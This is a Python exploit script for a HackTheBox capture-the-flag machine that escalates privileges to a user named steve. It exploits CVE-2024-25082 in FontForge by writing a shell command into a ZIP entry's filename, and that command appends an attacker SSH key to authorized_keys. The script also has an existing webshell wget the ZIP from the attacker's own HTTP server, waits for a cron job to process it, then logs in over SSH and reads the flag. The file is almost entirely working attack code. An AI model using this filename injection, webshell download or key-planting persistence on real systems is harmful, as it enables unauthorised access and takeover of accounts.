#!/usr/bin/env python3
"""
Phase 3: Privilege Escalation to steve
VariaType (Avatar) CTF - HackTheBox
Uses CVE-2024-25082 (FontForge ZIP filename injection)
"""

import subprocess
import zipfile
import time
import os
import requests

def generate_ssh_key():
    """Generate SSH key for steve"""
    print("[*] Generating SSH key for steve...")
    subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", "/tmp/steve_key", 
                   "-N", "", "-C", "steve@pwn"], capture_output=True)
    print("[+] Key generated: /tmp/steve_key")
    
    with open("/tmp/steve_key.pub", "r") as f:
        return f.read().strip()

def create_evil_zip(pub_key):
    """Create ZIP with command injection in filename"""
    print("[*] Creating evil ZIP with payload in filename...")
    
    # Payload that creates .ssh directory and adds key
    payload = f'x$(mkdir -p /home/steve/.ssh && echo "{pub_key}" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys).ttf'
    
    with zipfile.ZipFile("/tmp/evil.zip", "w") as z:
        z.writestr(payload, b"\x00" * 100)
    
    print(f"[+] evil.zip created")
    print(f"[*] Payload length: {len(payload)} chars")

def upload_and_trigger():
    """Upload evil.zip and wait for cron"""
    print("[*] Uploading evil.zip via webshell...")
    
    # Start HTTP server
    server = subprocess.Popen(
        ["python3", "-m", "http.server", "8888", "--bind", "0.0.0.0"],
        cwd="/tmp",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    LHOST = "<Your_IP_Address>"
    
    # Download to target via webshell
    url = f"http://portal.variatype.htb/files/shell.php?cmd=wget%20http://{LHOST}:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"
    try:
        requests.get(url, timeout=10)
        print("[+] evil.zip uploaded to target")
    except:
        print("[!] Upload may have failed, check manually")
    
    # Wait for cron
    print("[!] Waiting 60 seconds for cron job to process...")
    for i in range(60, 0, -1):
        print(f"\r[*] {i} seconds remaining...", end="", flush=True)
        time.sleep(1)
    print("\n[+] Wait complete!")
    
    server.terminate()

def verify_ssh():
    """Verify SSH access as steve"""
    print("[*] Testing SSH as steve...")
    
    RHOST = "<Tareget_IP>"
    result = subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
         "-i", "/tmp/steve_key", f"steve@{RHOST}", "whoami"],
        capture_output=True, text=True
    )
    
    if "steve" in result.stdout:
        print("[+] SSH as steve successful!")
        
        # Get user flag
        result = subprocess.run(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-i", "/tmp/steve_key",
             f"steve@{RHOST}", "cat ~/user.txt"],
            capture_output=True, text=True
        )
        user_flag = result.stdout.strip()
        print(f"[+] USER FLAG: {user_flag}")
        
        # Save flag
        with open("/tmp/user_flag.txt", "w") as f:
            f.write(user_flag)
        
        return True
    else:
        print("[-] SSH failed")
        print(f"    Error: {result.stderr}")
        return False

def main():
    print("="*60)
    print("Phase 3: Privilege Escalation to steve")
    print("="*60)
    
    pub_key = generate_ssh_key()
    create_evil_zip(pub_key)
    upload_and_trigger()
    
    if verify_ssh():
        print("\n[+] Phase 3 complete! You now have SSH access as steve.")
        print("    ssh -i /tmp/steve_key steve@<Tareget_IP>")
    else:
        print("\n[-] Phase 3 failed. Check if cron is running or try again.")

if __name__ == "__main__":
    main()
